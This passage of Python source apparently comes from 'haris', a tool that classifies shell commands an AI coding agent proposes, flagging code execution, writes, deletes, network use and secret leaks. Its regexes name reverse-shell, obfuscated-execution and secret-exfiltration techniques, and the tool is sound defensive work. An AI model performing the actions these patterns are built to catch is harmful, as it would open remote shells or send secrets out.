        write_paths(values(opts, "-t", "--target-directory"), ctx, "installs into")
    elif pos:
        write_paths(pos[-1:], ctx, "installs to")
        read_paths(pos[:-1], ctx, "copies")
    return Stage()


RISKY_MODE = re.compile(r"^(?:0?[0-7]?[0-7][0-7][2367]|[0-7]?[4-7][0-7]{3}|.*[ao][-+=]*[rwxX]*w.*|\+w|"
                        r".*[ugoa]*\+[rwx]*s.*)$")


def h_chmod(argv, ctx, stdin):
    program = argv[0]
    opts, pos = options(argv[1:], {"--reference"})
    if program == "chmod" and pos:
        mode = pos[0]
        if RISKY_MODE.match(mode) and not mode.startswith("-"):
            ctx.add("risky", f"`chmod {mode}` lets every user change these files or run them with more "
                             f"rights.")
        pos = pos[1:]
    elif program in ("chown", "chgrp", "setfacl", "chattr") and pos:
        pos = pos[1:]
    write_paths(pos, ctx, "changes the permissions of")
    return Stage()


def h_sed(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-e", "-f", "--expression", "--file", "-l", "--line-length"})
    scripts = values(opts, "-e", "--expression")
    if not scripts and not has(opts, "-f", "--file") and pos:
        scripts, pos = [pos[0]], pos[1:]
    for script in scripts:
        if SED_EXEC.search(script):
            ctx.add("dynamic", "This sed script runs shell commands (the `e` command).")
        for m in re.finditer(r"(?:^|[;\n}])\s*(?:\d+|\$|/[^/]*/)?\s*[wW]\s+(\S+)|/[gpiI0-9]*w\s+(\S+)",
                             script):
            write_paths([arg(m.group(1) or m.group(2))], ctx)
    read_paths(values(opts, "-f", "--file"), ctx)
    in_place = any(o[0] in ("-i", "--in-place") or o[0].startswith("--in-place") for o in opts)
    if in_place:
        write_paths(pos, ctx, "edits")
        rcs = [p for p in pos if os.path.basename(p) == ".npmrc"]
        if rcs and any("ignore-scripts" in s for s in scripts):
            ctx.add("risky", IGNORE_SCRIPTS_OFF_REASON.format(path=rcs[0]))
    elif pos:
        read_paths(pos, ctx)
    else:
        ctx.add("read", "Edits text it is given.")
    return Stage()


def h_awk(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-F", "-v", "-f", "--field-separator", "--assign", "--file"})
    program_files = values(opts, "-f", "--file")
    read_paths(program_files, ctx)
    script = "" if program_files else (pos[0] if pos else "")
    if not program_files:
        pos = pos[1:]
    if re.search(r"\bsystem\s*\(|\|\s*getline|\|\s*\"|\"\s*\|&?", script):
        ctx.add("dynamic", "This awk program runs shell commands.")
    for m in re.finditer(r">>?\s*\"([^\"]+)\"", script):
        write_paths([arg(m.group(1))], ctx)
    files = [p for p in pos if "=" not in p]
    if files:
        read_paths(files, ctx)
    else:
        ctx.add("read", "Processes text it is given.")
    return Stage()


def h_dd(argv, ctx, stdin):
    for a in argv[1:]:
        key, _, value = a.partition("=")
        if key == "if":
            read_paths([arg(value, a.marks)], ctx)
        elif key == "of":
            write_paths([arg(value, a.marks)], ctx)
    ctx.add("read", "Copies data (dd).")
    return Stage()


def h_truncate(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-s", "-r", "--size", "--reference"})
    write_paths(pos, ctx, "cuts")
    return Stage()


def h_tar(argv, ctx, stdin):
    args = list(argv[1:])
    if args and not args[0].startswith("-") and re.fullmatch(r"[A-Za-z]+", args[0]):
        args[0] = arg("-" + args[0])
    opts, pos = options(args, {"-f", "-C", "--file", "--directory", "-T", "-X", "--exclude", "--files-from",
                               "--transform", "--use-compress-program", "-I", "--to-command"})
    archive = values(opts, "-f", "--file")
    if has(opts, "-x", "--extract", "--get"):
        read_paths([a for a in archive if a != "-"], ctx)
        where = values(opts, "-C", "--directory") or [arg(".")]
        write_paths([arg(where[0].rstrip("/") + "/_")], ctx, "unpacks files into")
    elif has(opts, "-c", "--create", "-r", "--append", "-u", "--update"):
        write_paths([a for a in archive if a != "-"], ctx)
        read_paths(pos, ctx, "packs")
    else:
        read_paths([a for a in archive if a != "-"] or [arg(".")], ctx, meta=True)
    if values(opts, "--use-compress-program", "-I", "--to-command") or has(opts, "--checkpoint-action"):
        ctx.add("dynamic", "tar runs another program as part of this.")
    return Stage()


def h_zip(argv, ctx, stdin):
    program = argv[0]
    opts, pos = options(argv[1:], {"-d", "-x", "-i", "-P", "-n", "-b", "-t"})
    if program == "unzip":
        read_paths(pos[:1], ctx)
        if has(opts, "-l", "-v", "-t", "-z"):
            return Stage()
        where = values(opts, "-d") or [arg(".")]
        write_paths([arg(where[0].rstrip("/") + "/_")], ctx, "unpacks files into")
    elif pos:
        write_paths(pos[:1], ctx)
        read_paths(pos[1:], ctx, "packs")
    return Stage()


def h_compress(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-S", "--suffix", "-T", "--threads"})
    if has(opts, "-c", "--stdout", "-l", "--list", "-t", "--test") or not pos:
        read_paths(pos, ctx)
        if not pos:
            ctx.add("read", "Compresses what it is given.")
    else:
        write_paths(pos, ctx, "compresses in place")
    return Stage()


def h_patch(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-p", "-i", "-o", "-d", "-r", "-B", "-V", "-z", "--input", "--output",
                                   "--directory", "--strip"})
    read_paths(values(opts, "-i", "--input"), ctx)
    outputs = values(opts, "-o", "--output")
    if outputs:
        write_paths(outputs, ctx)
    elif pos:
        write_paths(pos[:1], ctx, "patches")
    else:
        base = values(opts, "-d", "--directory") or [arg(".")]
        write_paths([arg(base[0].rstrip("/") + "/_")], ctx, "patches files in")
    return Stage()


def h_mkdir(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-m", "--mode", "--context"})
    write_paths(pos, ctx, "creates")
    return Stage()


def h_editor(argv, ctx, stdin):
    ctx.add("exec", f"Opens the editor {argv[0]}.")
    return Stage()


# ---------------------------------------------------------------- interpreters and inline code

EXEC_SETTING = re.compile(r"\s*=\s*(?:True|False|None|\d+)\b")
CODE_EXEC = re.compile(r"\b(?:os\.system|os\.popen|os\.posix_spawnp?|os\.spawn[lv]p?e?|subprocess|Popen"
                       r"|check_output|check_call|execSync|execFileSync"
                       r"|spawnSync|spawn|child_process|pty\.spawn|Runtime\.getRuntime|shell_exec|passthru"
                       r"|proc_open|IO\.popen|Kernel\.system|do shell script|os\.exec[lv]p?e?)\b"
                       r"|\b(?:system|popen|exec)\s*\(")
BACKTICK_EXEC = re.compile(r"`[^`\n]+`")  # runs a shell command in ruby, perl and php; only text elsewhere
NO_BACKTICK_EXEC = re.compile(r"python|pypy|node|deno|bun|js")
CODE_HIDDEN = re.compile(r"(?i)\b(?:exec|eval|Function|compile)\s*\(\s*(?:[\w.]*b64decode|atob|Buffer\.from|"
                         r"[\w.]*decompress|codecs\.decode|bytes\.fromhex|__import__\(['\"](?:base64|zlib|codecs)|"
                         r"[\w.]*unhexlify|[\w.]*\.decode\()")
CODE_DELETE = re.compile(r"\b(?:shutil\.rmtree|os\.remove|os\.unlink|os\.rmdir|os\.removedirs|rmSync|"
                         r"unlinkSync|"
                         r"rmdirSync|fs\.rm\b|fs\.unlink|rimraf|FileUtils\.rm|File\.delete|rmtree)|"
                         r"\.(?:unlink|rmdir|rm)\s*\(|\bunlink\s*\(")
CODE_WRITE = re.compile(r"\bopen\s*\([^)]*['\"][wax]b?\+?['\"]|write_text|write_bytes|writeFileSync|"
                        r"writeFile\b|"
                        r"appendFile|createWriteStream|File\.write|file_put_contents|fopen\s*\([^)]*['\"][wax]|"
                        r"shutil\.(?:copy|move)|os\.rename|os\.replace|\.rename\s*\(|\bchmod\s*\(|symlink")
CODE_NET = re.compile(r"\b(?:requests\.|urllib|http\.client|httpx|aiohttp|socket\b|fetch\s*\(|axios|"
                      r"https?\.request|https?\.get|Net::HTTP|LWP::|curl_exec|smtplib|ftplib|paramiko|"
                      r"XMLHttpRequest|WebSocket|net\.connect|IO::Socket|TCPSocket|fsockopen)")
CODE_SHELL_SOCKET = re.compile(r"(?s)socket.*(?:dup2|pty\.spawn|/bin/(?:ba|z)?sh|subprocess|cmd\.exe|"
                               r"child_process)|(?:dup2|pty\.spawn).*socket|net\.Socket.*(?:spawn|/bin/sh)|"
                               r"(?:spawn|/bin/sh).*net\.Socket|TCPSocket.*(?:exec|spawn|/bin/sh)|"
                               r"fsockopen.*(?:exec|proc_open|/bin/sh)")
CODE_SECRET_ENV = re.compile(r"(?:os\.environ(?:\.get)?\s*[\[(]\s*['\"]|process\.env\.|getenv\s*\(\s*['\"]|"
                             r"ENV\[['\"])(\w+)")
# The whole environment at once (str(os.environ), dict(os.environ), JSON.stringify(process.env), %ENV):
# every token in it. Reading one variable, a copy handed to a child process or a default set are not (#350).
CODE_WHOLE_ENV = re.compile(r"(?<![\w.])(?<!env=)(?<!env\s=\s)os\.environ\b"
                            r"(?!\s*\[|\.(?:get|setdefault|pop|update|__setitem__)\b)"
                            r"|(?<![\w$])(?<![\w$]\.)(?<!env:\s)(?<!env:)process\.env\b(?!\s*[.\[])"
                            r"|\bENV\.(?:to_h|to_a|inspect|each|map)\b|%ENV\b")
STRING_LITERAL = re.compile(r"'''(.*?)'''|\"\"\"(.*?)\"\"\"|'((?:\\.|[^'\\\n])*)'|\"((?:\\.|[^\"\\\n])*)\"",
                            re.S)
SED_EXEC = re.compile(r"(?:^|[;\n{}])\s*(?:\d+|\$|/[^/]*/)?\s*e(?:\s|$|;)|/e\s*$"
                      r"|/[gpiI0-9]*e[gpiI0-9]*\s*$")
CODE_SELF = re.compile(r"\b(?:from|import)\s+(?P<module>haris|mizan|tabib)\b"
                       r"|nexika/(?:haris|mizan|itqan|tabib|lawha|status)\b"
                       r"|(?P<source>haris)/(?:bin|haris)"
                       r"|require\(['\"][^'\"]*(?P<required>haris)")
# Calls that change what haris and the plugins it guards keep: never fine, even from a source checkout.
SELF_WRITERS = re.compile(r"\b(?:add_approval|remove_approval|mark_active|save_session|publish_status|publish"
                          r"|save|record)\s*\(")
PATH_LIKE = re.compile(r"^(?:~|/|\.{1,2}/|[\w.-]+/)|^\.?[\w-]+\.\w{1,8}$|^\.\w+$")
# Calls that only turn one path into another: Path("~"), os.path.expanduser("~"), File.expand_path("/x").
PATH_WRAPPER = re.compile(r"^(?:(?:pathlib\.)?Path|PurePath"
                          r"|os\.path\.(?:expanduser|abspath|realpath|normpath)|path\.resolve|Pathname\.new|File\.expand_path|expanduser|abspath|realpath)\s*\(")
BACKTICKS = re.compile(r"`[^`]*`")


def call_end(text: str, start: int) -> int:
    """Where the bracket opened just before `start` closes (strings are skipped); -1 when it never does."""
    depth, i = 1, start
    while i < len(text):
        ch = text[i]
        if ch in "'\"`":
            m = (BACKTICKS if ch == "`" else STRING_LITERAL).match(text, i)
            i = m.end() if m else i + 1
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return -1


def arguments(text: str, start: int) -> list[str]:
    """The arguments of the call whose bracket opened just before `start`."""
    end = call_end(text, start)
    inner = text[start:end if end >= 0 else len(text)]
    out, depth, i, last = [], 0, 0, 0
    while i < len(inner):
        ch = inner[i]
        if ch in "'\"":
            m = STRING_LITERAL.match(inner, i)
            i = m.end() if m else i + 1
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
        elif ch == "," and depth == 0:
            out.append(inner[last:i].strip())
            last = i + 1
        i += 1
    return [*out, inner[last:].strip()]


def first_argument(text: str, start: int) -> str:
    return arguments(text, start)[0]


def literal_path(expr: str, text: str, depth: int = 0) -> str | None:
    """The path an expression in the code names outright: "/x", Path("/x"), os.path.expanduser("~"), or a
    variable only ever given one of those. None when the path is only known when the code runs."""
    expr = expr.strip()
    while tail := re.search(r"\.(?:expanduser|resolve|absolute)\(\)$", expr):
        expr = expr[:tail.start()].strip()
    m = PATH_WRAPPER.match(expr)
    if m and expr.endswith(")") and call_end(expr, m.end()) == len(expr) - 1:
        return literal_path(expr[m.end():-1], text, depth)
    m = STRING_LITERAL.fullmatch(expr)
    if m:
        lit = next(g for g in m.groups() if g is not None)
        return lit if lit and "\n" not in lit and not re.search(r"\$\{|%s|\{\w*\}", lit) else None
    if depth < 2 and re.fullmatch(r"\$?[A-Za-z_]\w*", expr):
        name = re.escape(expr.lstrip("$"))
        found = [literal_path(a.group(1), text, depth + 1) for a in
                 re.finditer(rf"(?m)(?:^|[\s;(,])(?:const\s+|let\s+|var\s+|my\s+)?\$?{name}\s*=(?!=)\s*"
                             r"([^\n;]+)", text)]
        if found and all(found) and len(set(found)) == 1:
            return found[0]
    return None


RUNS_TEXT = re.compile(r"\b(?:exec|eval|compile|execfile|runpy|__import__|Function)\b")


def python_strings(text: str) -> list[tuple[int, int]]:
    """Where Python code holds plain string data (not f-strings, not comments), as offsets. Empty when
    the code does not tokenize, so nothing is ever skipped by mistake."""
    import io
    import tokenize
    starts = [0]
    for line in text.splitlines(keepends=True):
        starts.append(starts[-1] + len(line))
    try:
        return [(starts[t.start[0] - 1] + t.start[1], starts[t.end[0] - 1] + t.end[1])
                for t in tokenize.generate_tokens(io.StringIO(text).readline)
                if t.type == tokenize.STRING and not re.match(r"(?i)[rbu]*f", t.string)]
    except (tokenize.TokenError, SyntaxError, IndentationError):
        return []


def code_matches(pattern: re.Pattern, text: str, data: list[tuple[int, int]]) -> list[re.Match]:
    """Matches that are code, not text the code only holds (a file's new contents, say)."""
    return [m for m in pattern.finditer(text) if not any(a <= m.start() < b for a, b in data)]


def exec_calls(text: str, data: list[tuple[int, int]]) -> list[re.Match]:
    """What CODE_EXEC finds, less a name set to a constant: a keyword argument or a setting such as
    `sympy.test(subprocess=False)` runs nothing (#342). Every other mention still counts, an import
    included: the call may come later through a name haris does not follow (`sys.modules[...]`)."""
    return [m for m in code_matches(CODE_EXEC, text, data)
            if not EXEC_SETTING.match(text, m.end())]


def code_targets(text: str, pattern: re.Pattern, data: list[tuple[int, int]] = ()) -> list[Arg]:
    """What the calls `pattern` finds act on: the path each one names, or UNKNOWN for a call whose path is
    only known when it runs (a variable set elsewhere, a computed string). Never a stray string from
    elsewhere in the code."""
    out: list[Arg] = []
    for m in code_matches(pattern, text, list(data)):
        opened = m.group().endswith("(")
        call = None if opened else re.compile(r"[\w.]*\s*\(").match(text, m.end())
        if not opened and not call:
            continue  # the name without a call: an import or a mention
        found = literal_path(first_argument(text, call.end() if call else m.end()), text)
        if found is None and m.group().startswith("."):  # Path("/x").unlink(): the path is the receiver
            receiver = re.search(r"((?:[\w.]+\s*)?(?:\((?:[^()]|\([^()]*\))*\))?)$", text[:m.start()])
            found = literal_path(receiver.group(1), text) if receiver else None
        out.append(arg(os.path.expanduser(found) if found and found.startswith("~") else found or UNKNOWN))
    return out or [arg(UNKNOWN)]


# What a write call writes to: its first argument, its second (copy, move, symlink: the destination),
# every argument (rename: both names change), or the object it is called on (Path(...).write_text).
WRITE_TARGET = (("receiver", re.compile(r"^(?:write_text|write_bytes)$")),
                ("second", re.compile(r"^(?:shutil\.(?:copy\w*|move)|\w*symlink\w*)$")),
                ("all", re.compile(r"^(?:os\.rename|os\.replace|\.rename\s*\()")))
READ_LITERAL = re.compile(r"""\b(?:open|readFileSync|readFile|fopen|File\.read|file_get_contents)\s*\(\s*"""
                          r"""(?:'([^'\n]*)'|"([^"\n]*)")\s*(?:\)|,\s*['"][r'"])"""
                          r"""|(?:'([^'\n]*)'|"([^"\n]*)")\s*\)\s*\.read_(?:text|bytes)\b""")


def receiver_of(text: str, at: int) -> str:
    """The expression a method is called on, just before the dot at `at`."""
    m = re.search(r"((?:[\w.]+\s*)?(?:\((?:[^()]|\([^()]*\))*\))?)\.?$", text[:at])
    return m.group(1).rstrip(".") if m else ""


def code_write_targets(text: str, literals: list[str], ctx: Ctx,
                       data: list[tuple[int, int]] = ()) -> list[Arg]:
    """Where code writes. Each write call's own target when the code names it; for one it does not name
    (a helper's parameter, a computed name), the path strings the code holds that are not only read,
    and an unknown target when those are none or reach beyond the project."""
    found: list[str] = []
    unresolved = False
    for m in code_matches(CODE_WRITE, text, list(data)):
        name = m.group().split("(")[0].strip()
        how = next((h for h, rx in WRITE_TARGET if rx.match(m.group()) or rx.match(name)), "first")
        if how == "receiver":
            candidates = [receiver_of(text, m.start())]
        else:
            call = re.compile(r"[\w.]*\s*\(").match(text, m.end())
            opened = m.start() + m.group().find("(") + 1 if "(" in m.group() else (call.end() if call else -1)
            if opened < 0:
                continue  # the name without a call
            args = arguments(text, opened)
            candidates = args[1:2] if how == "second" else args if how == "all" else args[:1]
        for expr in candidates or [""]:
            path = literal_path(expr, text)
            if path is None:
                unresolved = True
            else:
                found.append(path)
    if unresolved:
        only_read = {next(g for g in m.groups() if g is not None) for m in READ_LITERAL.finditer(text)}
        guesses = []
        for lit in literals:
            if not lit or "\n" in lit or len(lit) > 400 or not PATH_LIKE.match(lit) or lit in only_read:
                continue
            path = ctx.where.resolve(os.path.expanduser(lit), ctx.cwd)
            if path and not os.path.isdir(path):  # "/" or "~" in a string is no file being written
                guesses.append(lit)
        if guesses:
            found += guesses
        else:
            return [arg(os.path.expanduser(f)) for f in found] + [arg(UNKNOWN)]
    return [arg(os.path.expanduser(f)) for f in found] or [arg(UNKNOWN)]


def reaches_self(text: str, literals: list[str], ctx: Ctx, data: list[tuple[int, int]] = ()) -> bool:
    """Code that reaches into haris or a plugin it guards. In a project that holds their source (the
    Nexika repo), importing that source is ordinary work; the installed copies, their data and calls
    that change their data are still out of reach (#119)."""
    excused = False
    writes = bool(code_matches(SELF_WRITERS, text, list(data)))
    source = any(ctx.where.checkout(n) for n in ("haris", "mizan", "tabib"))
    for m in CODE_SELF.finditer(text):
        name = m.group("module") or m.group("source") or m.group("required")
        in_data = any(a <= m.start() < b for a, b in data)
        if name and ctx.where.checkout(name) and not writes:
            excused = True
        elif not name and in_data and source:
            excused = True  # their source, being edited, names their data folders
        else:
            return True
    return excused and any(
        ctx.where.place(ctx.where.resolve(os.path.expanduser(lit), ctx.cwd)) == "self"
        for lit in literals if lit and "\n" not in lit and len(lit) < 400 and PATH_LIKE.match(lit))


INTERPRETER_BEFORE = re.compile(r"""(?:\bsys\.executable|process\.execPath"""
                                r"""|['"](?:[\w./-]*/)?(?:python[\d.]*|pypy3?|node|ruby|perl)['"])"""
                                r"""\s*,\s*['"]-[ce]['"]\s*,\s*$""")


def interpreter_code(text: str, start: int) -> bool:
    """`[sys.executable, '-c', 'pass']`: the string is code for Python or another interpreter that is not
    a shell (Python's `pass` statement, not the pass password manager) (#266)."""
    return bool(INTERPRETER_BEFORE.search(text[max(0, start - 200):start]))


def code_check(code: Arg, ctx: Ctx, via: str, lang: str = "") -> Stage:
    """Code given inline (python -c, node -e ...): find what it does, and never approve it."""
    if UNKNOWN in code:
        if "download" in getattr(code, "marks", ()):
            ctx.add("download-run", f"`{via}` runs code it downloads, without you seeing it first.")
        else:
            ctx.add("dynamic", f"`{via}` runs code that is only known when it runs.")
        return Stage()
    text = str(code)
    matches = list(STRING_LITERAL.finditer(text))
    literals = [next(g for g in m.groups() if g is not None) for m in matches]
    # In Python that never runs text as code, what sits in plain strings is data: a file's new contents.
    data = python_strings(text) if re.search(r"python|pypy", lang) and not RUNS_TEXT.search(text) else []
    if reaches_self(text, literals, ctx, data):
        ctx.add("self", f"`{via}` reaches into haris itself, which Claude may not change.")
    if CODE_HIDDEN.search(text):
        ctx.add("dynamic", f"`{via}` runs code it first decodes, so nobody can see what it does.")
    if CODE_SHELL_SOCKET.search(text):
        ctx.add("remote-shell", f"`{via}` connects a shell to the network: whoever is on the other side can "
                                "run commands here.")
    network = bool(CODE_NET.search(text))
    executes = bool(exec_calls(text, data) or (not NO_BACKTICK_EXEC.search(lang or via)
                                                            and BACKTICK_EXEC.search(text)))
    paths: list[Arg] = []
    for i, lit in enumerate(literals):
        if not lit or len(lit) > 400:
            continue
        if executes and re.match(r"^[\w./~-]", lit) and not interpreter_code(text, matches[i].start()):
            inner = ctx.child(findings=[])
            try:
                walk(shell.parse(lit, shell.MAX_DEPTH - 2), inner)
            except shell.ParseError:
                pass
            ctx.findings += [f for f in inner.findings if LEVEL[TABLE[f.cls][1]] >= LEVEL[ASK]]
        if "\n" not in lit and PATH_LIKE.match(lit):
            paths.append(arg(os.path.expanduser(lit) if lit.startswith("~") else lit))
    if executes:
        ctx.add("dynamic", f"`{via}` runs shell commands from inside the code.")
    deletes, writes = bool(code_matches(CODE_DELETE, text, data)), bool(code_matches(CODE_WRITE, text, data))
    if deletes:
        delete_paths(code_targets(text, CODE_DELETE, data), ctx)
    if writes:
        write_paths(code_write_targets(text, literals, ctx, data), ctx)
    secret_hit = False
    for p in paths:
        path = ctx.where.resolve(p, ctx.cwd)
        if path and ctx.where.place(path) == "secret":
            secret_hit = True
            ctx.add("secret-read", f"`{via}` opens {ctx.show(path)}, which holds secrets.", path)
    secret_env = [n for n in CODE_SECRET_ENV.findall(text) if SECRET_VAR.search(n)]
    if network:
        if secret_hit:
            ctx.add("egress-secret", f"`{via}` reads a secret file and talks to the network.")
        elif CODE_WHOLE_ENV.search(text):
            ctx.add("egress-secret", f"`{via}` reads the whole environment, where tokens live, and talks to "
                                     "the network.")
        elif any(secrets.has_secret(lit) for lit in literals):
            ctx.add("egress-secret", f"`{via}` sends what looks like a secret over the network.")
        elif secret_env:
            ctx.add("egress-risk", f"`{via}` uses ${secret_env[0]} and talks to the network.")
        else:
            ctx.add("egress", f"`{via}` talks to the network.")
    elif secret_env and re.search(r"\bprint|console\.log|puts|echo", text):
        ctx.add("secret-read", f"`{via}` prints ${secret_env[0]}, which looks like a secret.")
    if any(SQL_DESTRUCTIVE.search(lit) for lit in literals):
        ctx.add("remote-irreversible", f"`{via}` runs SQL that deletes data (DROP, TRUNCATE or DELETE "
                                       f"without "
                                       "WHERE).")
    ctx.add("exec", f"Runs code with `{via}`; haris never approves code by itself.")
    return Stage()


PYTHON_MODULES_RUN = {"pytest", "unittest", "doctest", "mypy", "ruff", "black", "isort", "flake8", "pylint",
                      "coverage", "tox", "nox", "pyright", "compileall", "py_compile", "build", "bandit",
                      "pyflakes", "pycodestyle"}
# Modules that are tools haris already judges by name: `python -m X ...` gets X's own rule.
PYTHON_MODULE_TOOLS = {"twine", "hatch", "flit", "poetry", "pdm", "pipenv", "pipx", "uv"}


def h_python(argv, ctx, stdin):
    if h_db_reset(argv, ctx) is not None:
        return Stage()
    opts, pos = options(argv[1:], {"-c", "-m", "-W", "-X", "-Q"}, first_stops=True)
    code = values(opts, "-c")
    if code:
        return code_check(code[0], ctx, f"{argv[0]} -c", "python")
    module = values(opts, "-m")
    if module:
        name = module[0]
        own = re.match(r"(haris|mizan|tabib)(?:\.|$)", str(name))
        if own and not ctx.where.checkout(own.group(1)):
            ctx.add("self", f"Runs python -m {name}: the code of haris or of a plugin it guards, "
                            "outside their helpers.")
            return Stage()
        if name in PYTHON_MODULES_RUN:
            return project_run(ctx, f"Runs python -m {name} in the project.")
        if name == "pip":
            return h_pip([arg("pip"), *pos], ctx, stdin)
        if name in PYTHON_MODULE_TOOLS:  # `python -m twine upload` is `twine upload` (#138)
            return HANDLERS[name]([arg(name), *pos], ctx, stdin)
        if name in ("json.tool", "tabnanny", "this", "site", "platform", "sysconfig", "pydoc", "timeit"):
            ctx.add("read", f"Only shows information (python -m {name}).")
            return Stage()
        if name in ("venv", "virtualenv"):
            write_paths(pos[-1:] or [arg(UNKNOWN)], ctx, "creates a virtual environment at")
            return Stage()
        if name in ("http.server", "SimpleHTTPServer"):
            ctx.add("exec", "Starts a web server that shares the current folder.")
            return Stage()
        ctx.add("exec", f"Runs the Python module {name}.")
        return Stage()
    if has(opts, "-V", "--version", "-h", "--help"):
        ctx.add("read", "Shows the Python version.")
        return Stage()
    if not pos or pos[0] == "-":
        return interpreter_stdin(argv[0], ctx, stdin, "python")
    return script_run(argv[0], pos[0], ctx, rest=pos[1:])


def script_run(program: str, script: Arg, ctx: Ctx, how: str = "", rest: list | None = None) -> Stage:
    if "download" in script.marks:
        ctx.add("download-run", f"{program} runs a script it downloads, without you seeing it first.")
        return Stage()
    if UNKNOWN in script or "procsub" in script.marks:
        ctx.add("dynamic", f"{program} runs a script that is only known when it runs.")
        return Stage()
    path = ctx.where.resolve(script, ctx.cwd)
    if path and path in ctx.downloaded:
        ctx.add("download-run", f"Runs {ctx.show(path)}, which this command just downloaded.")
    elif path and path in ctx.written:
        return written_run(program, path, ctx, rest)
    elif path and (path == PLUGIN_ROOT + "/bin/haris" or HARIS_HELPER.search(path)):
        return own_helper([script, *(rest or [])], ctx, installed_helper(path, ctx))
    elif path and MIZAN_HELPER.search(path):
        return mizan_helper([script, *(rest or [])], ctx)
    elif path and path.startswith(PLUGIN_ROOT + "/") and not ctx.where.develops(PLUGIN_ROOT):
        ctx.add("self", "Runs haris's own code directly instead of through its helper.")
    else:
        ctx.add("exec", f"Runs {ctx.show(path)} {how or 'with ' + program}; haris does not read scripts, "
                        f"so Claude "
                        "Code's own permission rules apply.")
    return Stage()


def written_run(program: str, path: str, ctx: Ctx, rest: list | None = None, lang: str = "") -> Stage:
    """A script this same command wrote: haris reads what it will run and judges that."""
    text = ctx.written[path]
    lang = lang or program
    via = f"{ctx.show(path)} (written just before)"
    ctx.add("exec", f"Runs {ctx.show(path)}, which this command writes; haris read it before it runs.")
    if re.search(r"python|pypy|node|deno|bun|ruby|perl|php", lang):
        return code_check(arg(text), ctx, via, lang)
    return shell_string(arg(text), ctx, [str(path), *(str(r) for r in rest or [])], via)


def h_node(argv, ctx, stdin):
    program = argv[0]
    opts, pos = options(argv[1:], {"-e", "--eval", "-p", "--print", "-r", "--require", "--import", "--loader",
                                   "-C", "--conditions", "--input-type"}, first_stops=True)
    code = values(opts, "-e", "--eval", "-p", "--print")
    if code:
        return code_check(code[0], ctx, f"{program} -e", "js")
    if has(opts, "--test") or (program == "bun" and pos[:1] in (["test"], ["run"])):
        return project_run(ctx, f"Runs `{program} {' '.join(pos[:2])}` in the project.")
    if has(opts, "-v", "--version", "-h", "--help"):
        ctx.add("read", f"Shows the {program} version.")
        return Stage()
    if program == "bun" and pos[:1] in (["install"], ["add"], ["remove"], ["update"], ["x"]):
        return h_node_pm(argv, ctx, stdin) if pos[0] != "x" else npx([arg("bunx"), *pos[1:]], ctx, stdin)
    if not pos or pos[0] == "-":
        return interpreter_stdin(program, ctx, stdin, "js")
    return script_run(program, pos[0], ctx)


INLINE_FLAGS = {"ruby": ("-e",), "perl": ("-e", "-E"), "php": ("-r",), "lua": ("-e",), "rscript": ("-e",),
                "osascript": ("-e",), "tclsh": ()}


def h_script_lang(argv, ctx, stdin):
    """ruby, perl, php, lua, Rscript, osascript: inline code flags."""
    program = argv[0]
    if h_db_reset(argv, ctx) is not None:
        return Stage()
    flags = INLINE_FLAGS[program]
    with_arg = set(flags) | {"-I", "-M"}
    opts, pos = options(argv[1:], with_arg, first_stops=True)
    code = values(opts, *flags) if flags else []
    if code:
        if program == "perl" and any(o[0] == "-i" for o in opts):
            write_paths(pos, ctx, "edits")
        if program == "osascript":
            for m in re.finditer(r'do shell script\s+"((?:\\.|[^"\\])*)"', " ".join(code)):
                shell_string(arg(m.group(1)), ctx, [], "osascript")
        return code_check(arg("\n".join(code), joined_marks(code)), ctx, f"{program} {flags[0]}", program)
    if has(opts, "-v", "--version"):
        ctx.add("read", f"Shows the {program} version.")
        return Stage()
    if not pos or pos[0] == "-":
        return interpreter_stdin(program, ctx, stdin, program)
    return script_run(program, pos[0], ctx)


def h_powershell(argv, ctx, stdin):
    opts, pos = options(argv[1:], {"-c", "-command", "-Command", "-f", "-File", "-file", "-e", "-ec",
                                   "-EncodedCommand", "-encodedcommand", "-ExecutionPolicy",
                                   "-executionpolicy",
                                   "-WindowStyle", "-windowstyle"}, first_stops=True)
    if values(opts, "-e", "-ec", "-EncodedCommand", "-encodedcommand"):
        ctx.add("dynamic", "Runs an encoded PowerShell command, so nobody can see what it does.")
        return Stage()
    script = values(opts, "-f", "-File", "-file")
    if script:
        return script_run(argv[0], script[0], ctx)
    code = values(opts, "-c", "-command", "-Command")
    if code or pos:
        from . import powershell
        text = code[0] if code else arg(" ".join(pos), joined_marks(pos))
        if UNKNOWN in text:
            ctx.add("dynamic", "Runs PowerShell commands that are only known when they run.")
        else:
            powershell.classify(str(text), ctx)
        return Stage()
    return interpreter_stdin(argv[0], ctx, stdin, "powershell")


# ---------------------------------------------------------------- network


def egress_payload(ctx: Ctx, program: str, data: list[Arg], files: list[Arg], urls: list[Arg],
                   stdin: Stage | None, sends: bool) -> None:
    """Check what leaves the machine for secrets: literal values, uploaded files, URLs, piped input."""
    host = next((re.sub(r"^[a-z+.-]+://", "", u).split("/")[0].split("@")[-1] for u in urls if u), "a server")
    leaked = None
    for f in files:
        if f in ("-", "@-", ""):
            if stdin is not None and stdin.secret:
                leaked = "a secret piped into it"
            continue
        for path, _ in targets(f, ctx):
            if path and ctx.where.place(path) in ("secret", "self"):
                leaked = ctx.show(path)
            elif path is None and "secret" in f.marks:
                leaked = "a secret read by another command"
    for value in data + urls:
        if "secret" in value.marks:
            leaked = "a secret read by another command"
        query = value.partition("?")[2] if value in urls else str(value)
        if query and UNKNOWN not in query and secrets.has_secret(query):
            leaked = "what looks like a secret value"
    if leaked:
        ctx.add("egress-secret", f"Sends {leaked} to {host}. Secrets must not leave this computer.")
        return
    if stdin is not None and stdin.secret:
        ctx.add("egress-secret", f"Sends a secret piped into {program} to {host}.")
        return
    if any(re.search(r"://[^/\s:@]+:[^/\s@]+@", u) for u in urls):
        ctx.add("egress-risk", f"Puts a password in the address it sends to {host}.")
    ctx.add("egress", f"Sends data to {host}." if sends else f"Downloads from {host}.")


CURL_DATA = ("-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii", "--json")
CURL_FORM = ("-F", "--form", "--form-string")
CURL_ARGS = {"-o", "--output", "-H", "--header", "-X", "--request", "-u", "--user", "-A", "--user-agent",
             "-e",
